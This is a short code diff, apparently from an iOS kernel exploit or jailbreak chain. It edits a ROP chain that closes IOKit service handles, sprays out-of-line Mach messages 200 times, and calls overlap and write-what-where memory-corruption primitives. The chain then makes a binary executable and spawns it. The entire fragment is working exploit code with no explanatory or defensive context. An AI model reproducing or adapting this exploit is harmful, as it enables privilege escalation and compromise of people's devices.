@@ -1659,11 +1659,22 @@ step(i);\
     RopCallFunction9Deref1(PUSH, @"___syscall", 1, SEG_VAR(fd2), SYS_close, 0, 0, 0, 0, 0, 0, 0, 0);
     RopCallFunction9Deref1(PUSH, @"___syscall", 1, SEG_VAR(fd1), SYS_close, 0, 0, 0, 0, 0, 0, 0, 0);
     
-/* 
+ 
     [dy setSlide:dy.slide+1]; // enter thumb
     RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceClose), 0, SEG_VAR(gasgauge_), 1, SEG_VAR(gasgauge_), 0, 0, 0, 0, 0, 0, 0, 0, 0,0);
+    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceWaitQuiet), 0, SEG_VAR(svc), 5, SEG_VAR(zero), 0, SEG_VAR(waitTime), 0, 0, 0, 0, 0, 0, 0,0);
     [dy setSlide:dy.slide-1]; // exit thumb
-*/
+    
+    for (int i = 0; i < 200; i++) {
+        SendMsg(PUSH, i, oolmsg_template_512);
+    }
+    
+    ReadWriteOverlap();
+    tmptoscratch();
+    WriteWhatWhere(PUSH, 0xFFFFFFFF, SEG_VAR(scratch[0x20+1024-0x58]));
+    ReadWriteScratchOverlap();
+    
+    
     
     RopCallFunction3(PUSH, @"___syscall", SYS_chmod, SEG_VAR(spawnpath), 0755);
     RopCallFunction7(PUSH, @"___syscall", SYS_posix_spawn, m_m_scratch, SEG_VAR(spawnpath), 0, 0, SEG_VAR(spawnp), 0);
